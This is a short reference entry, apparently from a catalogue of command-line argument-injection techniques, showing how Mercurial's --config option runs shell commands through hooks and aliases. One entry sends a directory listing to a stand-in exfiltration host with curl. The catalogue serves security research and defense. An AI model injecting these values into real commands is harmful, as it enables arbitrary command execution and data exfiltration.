---
title: hg
description: hg (Mercurial) is a source control management tool.
functions:
  command:
    - code: |
        hg init --config=hooks.pre-init="sh -c 'ls'"
    - code: |
        hg init --config=alias.init="!uname -a"
    - code: |
        hg cat '--config=alias.cat=!touch /tmp/foo'
    - code: |
        hg clone '--config=alias.clone=!touch /tmp/foo'
  file-upload:
    - code: |
        hg init --config=alias.identify=!curl http://exfiltration-host.tld --data "$(ls -alh)"
---
